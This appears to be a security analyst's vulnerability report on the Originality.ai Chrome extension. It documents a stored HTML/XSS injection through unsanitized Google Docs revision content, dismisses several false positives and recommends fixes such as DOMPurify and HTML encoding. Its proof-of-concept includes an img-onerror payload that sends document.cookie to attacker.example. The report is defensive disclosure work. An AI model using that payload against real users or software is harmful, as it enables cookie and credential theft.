# Vulnerability Report: AI Detector and Human Writing Report - Originality.ai

**Extension ID:** `kdngfaamkbbkdbemejnlkmjfpmndjdmb`
**Version:** 0.0.6
**Manifest Version:** 3
**Triage Flags:** V1=4, V2=2 (innerhtml_dynamic, postmessage_no_origin, document_write, dynamic_tab_url)
**Analyst Date:** 2026-02-06

---

## Executive Summary

This extension provides AI content detection and writing analysis for Google Docs. It fetches Google Docs revision history, reconstructs document changes as HTML, and renders them in a playback viewer within an extension tab. One verified vulnerability was found: **Stored Cross-Site Scripting (XSS)** via unsanitized Google Docs revision content injected into innerHTML within the extension's privileged tab page context.

The remaining triage flags (postMessage without origin check, document.write, dynamic tab URL) were investigated and determined to be false positives attributable to third-party libraries (core-js setImmediate polyfill, jsPDF, Dexie.js BroadcastChannel) and safe first-party patterns.

---

## Verified Vulnerabilities

### VULN-1: Stored XSS via Unsanitized Google Docs Revision Content in innerHTML

**CVSS 3.1 Score:** 6.1 (Medium)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

**Affected Files and Lines:**
- **HTML construction (source):** `assets/vuetify-Z9JgK3wF.js:6588-6597` -- Function `y()` builds HTML from revision character data without sanitization
- **HTML storage:** `assets/vuetify-Z9JgK3wF.js:6576-6587` -- Unsanitized HTML stored as `rendered` field in IndexedDB via Dexie
- **innerHTML sink #1:** `tab.js:12618` -- Minimap component: `innerHTML: (o = De(A)) == null ? void 0 : o.rendered`
- **innerHTML sink #2:** `tab.js:12849` -- Playback index component: `innerHTML: (_ = De(i)) == null ? void 0 : _.rendered`

**Description:**

The extension fetches Google Docs revision history from `docs.google.com/document/d/{id}/revisions/load` (at `vuetify-Z9JgK3wF.js:6321`). The changelog entries contain individual text operations (inserts and deletes) with an `s` field representing the string inserted by a collaborator. These strings are split into individual character objects `{s: char}` at line 6415-6416.

When rendering a revision for the playback viewer, function `y()` at line 6588-6597 concatenates all character `.s` values directly into an HTML string, wrapping the changed range in `<ins>` or `<del>` tags:

```javascript
// vuetify-Z9JgK3wF.js:6588-6597
y = async (g, h, p, S, P) => {
    let A = "",
        _ = "";
    return g.length < 1e6 && g.forEach((M, x) => {
        M && (x === S && (A += h.ty === "is" || h.ty === "iss" ?
            '<ins class="insertion">' : '<del class="deletion">'),
        M.s === "\n" ? (_ += " ", A += "<br>") : (A += M.s, _ += M.s),
        x === P && (A += h.ty === "is" || h.ty === "iss" ? "</ins>" : "</del>"))
    }), {
        html: A,
        rawText: _
    }
};
```

The critical line is `A += M.s` -- each character from the Google Docs revision is concatenated directly into the HTML string without any HTML entity encoding or sanitization. The resulting HTML is stored in IndexedDB as `rendered` (line 6579) and later assigned to `innerHTML` (tab.js lines 12618, 12849) without passing through DOMPurify or any sanitization.

Note: The extension *does* include DOMPurify (`assets/purify.es-a-CayzAK.js`), but it is only used by the jsPDF library for PDF-from-string rendering (tab.js:6517-6584). It is **not** used for revision content rendering.

**Proof-of-Concept Exploit Scenario:**

1. Attacker creates or has edit access to a Google Doc shared with the victim.
2. Attacker types the following string into the document (which becomes part of the revision history):
   ```
   <img src=x onerror="fetch('https://attacker.example/steal?cookie='+document.cookie)">
   ```
3. Victim has the Originality.ai extension installed and opens the shared Google Doc.
4. Victim clicks "Generate" or "Re-scan" from the Originality.ai dropdown menu in the Google Docs toolbar.
5. The extension fetches revision history, processes the changelog, and stores the revision with the attacker's payload concatenated into the `rendered` HTML field.
6. When the victim opens the "View writing" playback tab, the extension renders the revision via `innerHTML`, and the `<img>` tag's `onerror` handler executes JavaScript in the `chrome-extension://` origin.

The payload is split into individual characters when stored (e.g., `<`, `i`, `m`, `g`, ...) but concatenated back into the full HTML tag during rendering, reconstructing the malicious payload.

**Impact:**

- **Execution context:** The XSS executes within the extension's tab page (`chrome-extension://kdngfaamkbbkdbemejnlkmjfpmndjdmb/src/tab.html`), which has access to `chrome.runtime.sendMessage`.
- **Available actions via message API:** The attacker's script can invoke any handler in the background script's message router (background.ts-BtApMGtW.js:20-44), including:
  - `chrome.tabs.create` with arbitrary URLs (phishing, redirect to malicious sites)
  - Read/write to `chrome.storage.local` (exfiltrate or tamper with stored data including auth tokens)
  - Read all stored revisions from IndexedDB (exfiltrate document content)
  - Clear all user data (`clear-all-revisions`, `clear-all-by-doc-id`)
- **Persistence:** The malicious revision is stored in IndexedDB and will re-trigger every time the victim opens the playback view for that document.
- **Cross-document impact:** Limited to the specific document containing the malicious revision content.

**Mitigating Factors:**

- The attacker must be a collaborator (editor) on the Google Doc, which limits the attack surface to shared documents. However, Google Docs are commonly shared with many collaborators (e.g., in organizational settings).
- Google Docs revision history stores text operations, not raw HTML. The characters are individually stored, but they are reconstructed into contiguous HTML during rendering.
- Manifest V3 Content Security Policy for extension pages restricts inline script execution by default. However, event handler attributes (like `onerror`) may still execute depending on the CSP configuration. The extension does not define a custom CSP in manifest.json, so the default MV3 CSP (`script-src 'self'`) applies, which **blocks inline event handlers**. This significantly reduces exploitability but does not eliminate all risk -- for example, DOM clobbering attacks or CSS injection via crafted revision content could still be possible.

**Revised Assessment with MV3 CSP:**

The default MV3 CSP (`script-src 'self'; object-src 'self'`) blocks inline event handlers like `onerror`, `onclick`, etc. and inline `<script>` tags. This means a direct JavaScript execution via innerHTML is **blocked by CSP** in the extension tab context. However:

1. **HTML injection** is still possible -- an attacker can inject arbitrary HTML elements (images, iframes to `chrome-extension://` resources, styled overlays) that could be used for UI spoofing/phishing within the extension tab.
2. **CSS injection** via `<style>` tags in the revision content could alter the appearance of the extension UI.
3. If a future CSP relaxation occurs (e.g., adding `'unsafe-inline'`), this becomes immediately exploitable for full XSS.
4. The `rendered` field is also used in `split(" ").length` for word count (tab.js:12732), which is safe, but any future uses of this unsanitized field would inherit the vulnerability.

**Adjusted CVSS considering MV3 CSP mitigation:** 4.1 (Medium)
**Adjusted Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N`

---

## False Positives (Investigated and Dismissed)

### FP-1: postMessage without origin check (index.es-BzmtHAF9.js:867, 882)

**File:** `assets/index.es-BzmtHAF9.js:866-888`

This is a **core-js `setImmediate` polyfill** that uses `window.postMessage` as a task scheduling mechanism. The `postMessage` targets the same origin (`St.protocol + "//" + St.host`), and the message listener at line 863-864 (`Kn`) only processes task IDs from the internal task queue (`xt`). This is a well-known, safe polyfill pattern.

### FP-2: postMessage in Dexie.js (dexie.ts-5xQgkh47.js:4269)

**File:** `assets/dexie.ts-5xQgkh47.js:4264-4269`

This is **Dexie.js v4.0.8** using `BroadcastChannel.postMessage` for cross-tab IndexedDB change notification. Standard library behavior for database synchronization.

### FP-3: document.write in jsPDF (tab.js:2150, 2158, 2171)

**File:** `tab.js:2144-2171`

All three `document.write` calls are within the **jsPDF library's** PDF output functions (`pdfobjectnewwindow`, `pdfjsnewwindow`, `dataurlnewwindow`). These write PDF viewer HTML into newly opened windows. The content is constructed from library-controlled templates and PDF data URIs, not from user-controlled input.

### FP-4: innerHTML in sidebar CSS scoping (sidebar.ts-CyMurLpa.js:146)

**File:** `assets/sidebar.ts-CyMurLpa.js:144-147`

Function `N()` reads the innerHTML of the `#vuetify-theme-stylesheet` `<style>` element (Vuetify-generated CSS), applies a CSS selector prefix (`.originality-extension-style-root`), and writes it back. The content is Vuetify framework-generated CSS, not attacker-controlled data. Operating on a `<style>` element's innerHTML with CSS content is safe.

### FP-5: innerHTML with DOMPurify in jsPDF/html2pdf (tab.js:6529)

**File:** `tab.js:6527-6530`

The `i()` function uses `innerHTML` but explicitly passes the content through `o.dompurify.sanitize()` first: `g.innerHTML = o.dompurify.sanitize(o.innerHTML)`. This is properly sanitized.

### FP-6: innerHTML in html2canvas bounds test (tab.js:15940)

**File:** `tab.js:15936-15940`

Uses `innerHTML` with a hardcoded emoji string `"&#128104;".repeat(10)` for text rendering bounds testing. No attacker-controlled input.

### FP-7: dynamic_tab_url in background.ts (background.ts-BtApMGtW.js:59-64)

**File:** `assets/background.ts-BtApMGtW.js:58-65`

Tab creation uses `src/tab.html?tab=${e.tab}&docId=${e.docId}&docTitle=${e.docTitle}` where `tab` is constrained to known values ("welcome", "playback", "report") and `docId`/`docTitle` come from the extension's own content scripts via `chrome.runtime.sendMessage`. The URL always points to the extension's own tab.html page. Values extracted via `URLSearchParams.get()` in tab.js are used in `document.title` (safe) and Vue text interpolation with `vt()` (safe, auto-escaped).

---

## Recommendations

1. **Sanitize revision HTML before innerHTML assignment.** Pass the `rendered` HTML through DOMPurify (already bundled as `assets/purify.es-a-CayzAK.js`) before assigning to innerHTML in both the Minimap component (tab.js:12618) and the playback index component (tab.js:12849).

2. **Alternatively, use textContent or Vue's text interpolation** (`v-text` / `{{ }}`) instead of `v-html`/innerHTML for revision content, since the revision text should be plain text with only `<ins>`, `<del>`, and `<br>` markup. A safer approach would be to construct DOM nodes programmatically rather than via HTML string concatenation.

3. **HTML-encode characters during revision HTML construction** in `vuetify-Z9JgK3wF.js:6591-6593`. Before concatenating `M.s` into the HTML string, apply HTML entity encoding to escape `<`, `>`, `&`, `"`, and `'`.

---

## Extension Architecture Summary

| Component | File | Role |
|-----------|------|------|
| Service Worker | `service-worker-loader.js` -> `assets/background.ts-BtApMGtW.js` | Message routing, tab management, IndexedDB operations |
| Content Script (all URLs) | `assets/sidebar.ts-loader-D7KBi7W2.js` -> `assets/sidebar.ts-CyMurLpa.js` | Sidebar UI injection |
| Content Script (Google Docs) | `assets/googleDocs.ts-loader-H670Q6jC.js` -> `assets/googleDocs.ts-D1KrlNpf.js` | Google Docs integration, revision fetching |
| Tab Page | `src/tab.html` -> `tab.js` | Playback viewer, report viewer, welcome page |
| Database | `assets/dexie.ts-5xQgkh47.js` | IndexedDB wrapper (Dexie v4.0.8) for revision storage |
| Revision Processing | `assets/vuetify-Z9JgK3wF.js:6378-6598` | Changelog parsing, revision HTML construction |
| Sanitizer (unused for revisions) | `assets/purify.es-a-CayzAK.js` | DOMPurify (only used by jsPDF) |

**Permissions:** `storage`, `tabs`, `contextMenus`
**Content Script Match:** `<all_urls>` (sidebar), `*://docs.google.com/document/*/edit*` (Google Docs integration)
